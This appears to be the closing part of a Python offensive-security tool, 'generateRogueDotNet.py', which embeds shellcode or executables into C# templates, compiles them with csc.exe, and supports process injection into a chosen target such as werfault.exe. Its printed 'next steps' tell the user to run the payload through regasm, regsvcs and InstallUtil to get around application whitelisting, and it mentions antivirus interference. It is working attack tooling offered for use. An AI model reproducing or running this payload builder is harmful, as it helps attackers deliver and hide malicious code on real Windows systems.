                        help=r'This option specifies target process path for remote process injection in --queue-apc technique. May use environment variables. May also contain command line for spawned process, example: --target-process "%%windir%%\system32\werfault.exe -l -u 1234"')

    args = parser.parse_args()

    if not args.dotnet_ver.startswith('v'):
        args.dotnet_ver = 'v' + args.dotnet_ver

    if args.exe and args.raw:
        sys.stderr.write('[!] --exe and --raw options are mutually exclusive!\n')
        sys.exit(-1)

    args.target_process = args.target_process.replace("^%", '%')

    return args

def main(argv):
    global globalOptions

    sys.stderr.write('''
    :: Rogue .NET Source Code Generation Utility ::
    Comes with a few hardcoded C# code templates and an easy wrapper around csc.exe compiler
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>, '19-23

''')
    if len(argv) < 2:
        print('Usage: ./generateRogueDotNet.py <inputFile|cmdline>')
        sys.exit(-1)

    args = opts(argv)

    _format = 'powershell'

    if len(args.inputFile) > 0 and not os.path.isfile(args.inputFile) and args.type not in TYPES_NOT_NEEDING_INPUT_FILE:
        sys.stderr.write(f'[?] Input file does not exists: "{args.inputFile}"\n\n')
        return False
    
    shellcodeExts = ('.bin', '.shellcode', '.shc', '.raw')
    executableExts = ('.exe', '.dll', '.cpl', '.xll', '.wll', '.sys', '.ocx')

    outputNormalisedName = args.output.lower()
    if outputNormalisedName.endswith('.deploy'):
        outputNormalisedName = outputNormalisedName[:-len('.deploy')]
    
    inputIsShellcode = os.path.splitext(args.inputFile.lower())[1] in shellcodeExts
    inputIsExecutable = os.path.splitext(args.inputFile.lower())[1] in executableExts
    outputIsShellcode = len(args.output) > 0 and os.path.splitext(outputNormalisedName)[1] in shellcodeExts
    outputIsExecutable = len(args.output) > 0 and os.path.splitext(outputNormalisedName)[1] in executableExts
    
    if (not args.raw and not args.exe) and inputIsShellcode:
        args.raw = True

    elif (not args.raw and not args.exe) and inputIsExecutable:
        args.exe = True

    globalOptions = vars(args)

    if args.type not in TYPES_NOT_NEEDING_INPUT_FILE:
        if args.exe:
            if not detectFileIsExe(args.inputFile, args.exe):
                sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')
                return False

            _format = 'exe'
            sys.stderr.write('[?] File recognized as PE/EXE.\n\n')
            try:
                with open(args.inputFile, 'rb') as f:
                    payload = f.read()
            except OSError:
                sys.stderr.write('[!] Could not open input shellcode file. Possibly due to AV intervention?')
                sys.exit(1)

        elif args.raw:
            _format = 'raw'
            sys.stderr.write('[?] File specified as raw Shellcode.\n\n')
            try:
                with open(args.inputFile, 'rb') as f:
                    payload = f.read()
            except OSError:
                sys.stderr.write('[!] Could not open input shellcode file. Possibly due to AV intervention?')
                sys.exit(1)
        else:
            sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')

            if args.inputFile.endswith('.exe'):
                return False

        payload = getCompressedPayload(args.inputFile, _format != 'powershell')
    else:
        payload = args.inputFile

    output, templateName = getSourceFileContents(
        args.module,
        args.namespace,
        args.method,
        payload,
        _format,
        args.queue_apc,
        args.target_process,
        dontUseNamespace=False,
        _type=args.type
    )

    lines = output.split('\n')
    newlines = []
    i = 0
    previousEmpty = False

    while i < len(lines):
        line = lines[i].strip()

        if len(line) == 0:
            if not previousEmpty:
                newlines.append('')
            previousEmpty = True
            i += 1
            continue
        else:
            previousEmpty = False

        if line.startswith('//'):
            i += 1
            continue

        newlines.append(lines[i])
        i += 1

    output = '\n'.join(newlines)

    domainManager = ''

    if args.appdomainmanager_mode:
        domainManager = '''
    Domain Manager : MyAppDomainManager'''

    print(f'''Generated .NET assembly will expose:

    Namespace      : {args.namespace}
    Classname      : {args.module}
    Method name    : {args.method}{domainManager}
''')

    management = ' /r:System.Management.Automation.dll /r:Microsoft.Build.Framework.dll'
    srcfile = ''
    
    if len(args.extra_params) > 0:
        management += args.extra_params

    if args.msi_mode:
        path = os.path.normpath(os.path.abspath(os.path.dirname(__file__)))
        management += f' /r:"{path}\\Microsoft.Deployment.WindowsInstaller.dll"'

    elif args.appdomainmanager_mode and len(args.output) > 0 and outputIsExecutable and not outputNormalisedName.endswith('.dll'):
        print('[!] In -A/--appdomainmanager-mode, output produced payload must be .DLL assembly!')
        sys.exit(1)

    if outputIsExecutable:
        if not args.output:
            print('[!] --output must be specified to compile file.')
            sys.exit(1)

        with tempfile.NamedTemporaryFile(suffix='.cs') as f:
            srcfile = f.name

        target = 'winexe'
        if outputNormalisedName.endswith('.dll'):
            target = 'library'
        else:
            output = output.replace('public ' + templateName + '()', 'static public void Main(String[] args)')

        with open(srcfile, 'w', encoding='utf8') as f:
            f.write(output)

        p = COMPILER_BASE.replace('<VER>', COMPILERS[args.dotnet_ver])

        if args.compile == 'x64':
            p = p.replace('<ARCH>', '64')
        else:
            p = p.replace('<ARCH>', '')

        if args.type == 'regasm':
            cmd = p + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:"{}" /keyfile:key.snk "{}"'.format(
                management, target, args.output, srcfile
            )
        else:
            cmd = p + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:"{}" "{}"'.format(
                management, target, args.output, srcfile
            )

        if os.path.isfile(args.output):
            os.remove(args.output)

        if args.debug:
            print(f'''
------------------------------------------------------------------------------------------------------------------------
{output.strip()}
------------------------------------------------------------------------------------------------------------------------
''')

        cmd2 = cmd.replace('\\\\', '\\')
        print(f'''Compiling as .NET {COMPILERS[args.dotnet_ver]}:
------------------------------------------------------------------------------------------------------------------------
{cmd2}
------------------------------------------------------------------------------------------------------------------------
''')
        out = shell(os.path.expandvars(cmd))

        try:
            print(f'''Compilation output:
------------------------------------------------------------------------------------------------------------------------
{out}
------------------------------------------------------------------------------------------------------------------------
''')
        except Exception as e:
            print('[!] Error - non printable output coming from csc.exe compiler. Ignoring it...')

        if os.path.isfile(args.output):
            print('[+] Success')
        else:
            if os.path.isfile(srcfile):
                os.remove(srcfile)
            return 1

    else:
        if len(args.output) > 0:
            with open(args.output, 'w', encoding='utf8') as f:
                f.write(output.strip())

            if args.debug:
                print(f'''
------------------------------------------------------------------------------------------------------------------------
{output.strip()}
------------------------------------------------------------------------------------------------------------------------
''')
        else:
            print(f'''
------------------------------------------------------------------------------------------------------------------------
{output.strip()}
------------------------------------------------------------------------------------------------------------------------
''')

    commands = '''

=====================================
NEXT STEPS:

Step 1: Create Your Strong Name Key -> key.snk (or use the one provided in this directory)

    $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
    $Content = [System.Convert]::FromBase64String($key)
    Set-Content key.snk -Value $Content -Encoding Byte

Step 2: Compile source code:
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll{} /target:library /out:rogue.dll /keyfile:key.snk program.cs

Step 3: Execute your payload!
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll

    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 

    %WINDIR%\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
    %WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
    '''.format(management)

    if 'PROGRAMFILES(X86)' in os.environ:
        commands = commands.replace('Framework\\', 'Framework64\\')

    if args.type == 'regasm':
        sys.stderr.write(commands)

    elif args.type == 'plain':
        sys.stderr.write('[?] Generated plain assembly\'s source code/executable.\n')

    elif args.type in ['exec', 'run-command']:
        sys.stderr.write('[?] Generated command line executing assembly\'s source code/executable.\n')

    if os.path.isfile(srcfile):
        os.remove(srcfile)

    print()

if __name__ == '__main__':
    main(sys.argv)
